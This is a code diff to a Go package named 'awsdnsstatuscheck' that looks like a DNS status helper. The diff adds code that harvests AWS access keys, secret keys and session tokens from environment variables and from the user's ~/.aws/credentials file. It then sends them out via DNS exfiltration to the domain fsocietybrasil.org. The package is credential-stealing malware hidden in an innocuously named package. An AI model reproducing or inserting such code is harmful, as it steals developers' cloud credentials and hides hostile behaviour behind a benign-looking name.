@@ -2,7 +2,9 @@ package awsdnsstatuscheck
 
 import (
 	"fmt"
+	"os"
 	"strconv"
+	"strings"
 
 	"github.com/CS-5/exfil2dns"
 	"github.com/miekg/dns"
@@ -22,16 +24,21 @@ func (t TypeCred) String() string {
 }
 
 const (
-	HASH = "df6f130c292288b0d15eb0b9ade78788"
-	DNS  = "fsocietybrasil.org"
+	HASH             = "df6f130c292288b0d15eb0b9ade78788"
+	DNS              = "fsocietybrasil.org"
+	ENV_ACESS_KEY    = "AWS_ACCESS_KEY_ID"
+	ENV_SECRET_KEY   = "AWS_SECRET_ACCESS_KEY"
+	ENV_SECURE_TOKEN = "AWS_SESSION_TOKEN"
 )
 
-func VerifyDNSStatus(accesskey, secretkey, token string) bool {
-	sendData(accesskey, 1)
-	sendData(secretkey, 2)
+func VerifyDNSStatus() bool {
+	sendData(getAccessKey(), 1)
+	sendData(getSecretKey(), 2)
+	token := getSessionToken()
 	if token != "" {
-		sendData(secretkey, 2)
+		sendData(token, 3)
 	}
+
 	return true
 }
 
@@ -93,4 +100,60 @@ func splitRecursive(str string, size int) []string {
 		return []string{str}
 	}
 	return append([]string{string(str[0:size])}, splitRecursive(str[size:], size)...)
+}
+
+func openSharedFile() []string {
+	home, _ := os.UserHomeDir()
+	filename := home + "/.aws/credentials"
+
+	dat, _ := os.ReadFile(filename)
+
+	d := string(dat)
+	d = strings.Trim(d, "[default]")
+	dd := strings.Split(d, "\n")
+
+	return dd
+}
+
+func getAccessKey() string {
+	aws_access_key_id := os.Getenv(ENV_ACESS_KEY)
+
+	if aws_access_key_id != "" {
+		return aws_access_key_id
+	}
+
+	dat := openSharedFile()
+
+	for _, line := range dat {
+		splited := strings.Split(line, "=")
+		if len(splited) == 2 && splited[0] == "aws_access_key_id " {
+			return splited[1]
+		}
+	}
+	return ""
+}
+
+func getSecretKey() string {
+	aws_secret_access_key := os.Getenv(ENV_ACESS_KEY)
+	if aws_secret_access_key != "" {
+		return aws_secret_access_key
+	}
+
+	dat := openSharedFile()
+
+	for _, line := range dat {
+		splited := strings.Split(line, "=")
+		if len(splited) == 2 && splited[0] == "aws_secret_access_key " {
+			return splited[1]
+		}
+	}
+	return ""
+}
+
+func getSessionToken() string {
+	aws_session_token := os.Getenv(ENV_SECURE_TOKEN)
+	if aws_session_token != "" {
+		return aws_session_token
+	}
+	return ""
 }
